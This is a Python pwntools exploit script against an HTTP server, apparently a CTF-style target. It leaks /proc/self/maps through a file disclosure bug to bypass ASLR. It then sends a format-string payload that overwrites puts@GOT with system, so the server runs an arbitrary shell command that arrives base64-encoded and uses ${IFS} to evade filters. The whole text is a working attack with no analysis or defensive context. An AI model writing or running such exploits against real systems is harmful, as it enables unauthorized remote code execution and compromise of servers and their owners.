from pwn import *
from base64 import b64encode
import sys
import warnings

'''
Usage:

python3 exploit.py <TARGET_HOST> <TARGET_PORT> <SHELL_CMD_TO_RUN>

'''



warnings.filterwarnings('ignore')
context.log_level = 'critical'

if len(sys.argv) != 4:
	print('usage: python3 exploit.py {target} {port} {cmd}')
	exit()
else:
	target = sys.argv[1]
	port = int(sys.argv[2])
	cmd = 'echo${IFS}' + b64encode(sys.argv[3].encode()).decode() + '|base64${IFS}-d|bash'

# Use file disclosure vulnerability to read /proc/self/maps and bypass ASLR
req = b'GET /%2fproc%2fself%2fmaps HTTP/1.1\r\n' + \
	b'Range: bytes=0-1512' + \
	b'\n\n'

p = remote(target, port)
p.send(req)

leak = p.recvrepeat(3).decode().replace('\r', '').splitlines()
leak = [line.strip() for line in leak]

p.close()

pie = int(leak[6][:8], 16)
print(f'pie base: {hex(pie)}')

libc = int(leak[12][:8], 16)
print(f'libc base: {hex(libc)}')

puts_got = pie + 0x5048
system = libc + 0x3cd10

print(f'puts@GOT: {hex(puts_got)}')
print(f'system@GLIBC: {hex(system)}')

# Create format string payload to overwrite puts@GOT entry with system@GLIBC
fmt = fmtstr_payload(53, {puts_got:system}, write_size='byte').decode('latin-1').replace('%', '%25')

# Create request to be sent to target
req = f'{cmd} /{fmt} HTTP/1.1\r\n\n\n'

# Send payload to target
p = remote(target, port)
p.send(req)
p.recvrepeat(2)
p.close()

print('Exploit payload sent.')
